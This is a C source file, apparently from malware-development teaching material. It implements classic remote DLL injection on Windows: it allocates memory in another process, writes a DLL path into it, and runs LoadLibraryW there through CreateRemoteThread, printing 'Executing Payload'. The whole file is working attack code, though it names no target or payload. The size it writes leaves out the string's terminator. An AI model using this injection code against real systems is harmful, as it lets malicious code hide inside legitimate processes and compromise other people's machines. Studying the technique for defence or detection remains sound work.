#include <Windows.h>
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
    BOOL bSTATE = TRUE;

    LPVOID pLoadLibraryW = NULL;
    LPVOID pAddress = NULL;

    // fetching the size of DllName *in bytes*
    DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);

    SIZE_T lpNumberOfBytesWritten = NULL;

    HANDLE hThread = NULL;

    pLoadLibraryW =
        GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress,
           dwSizeToWrite);
    printf("[#] Press <Enter> To Write ... ");
    getchar();

    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite,
                            &lpNumberOfBytesWritten) ||
        lpNumberOfBytesWritten != dwSizeToWrite) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n",
               GetLastError());
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
    printf("[#] Press <Enter> To Run ... ");
    getchar();

    printf("[i] Executing Payload ... ");
    hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress,
                                 NULL, NULL);
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n",
               GetLastError());
        bSTATE = FALSE;
        goto _EndOfFunction;
    }
    printf("[+] DONE !\n");

_EndOfFunction:
    if (hThread) CloseHandle(hThread);
    return bSTATE;
}
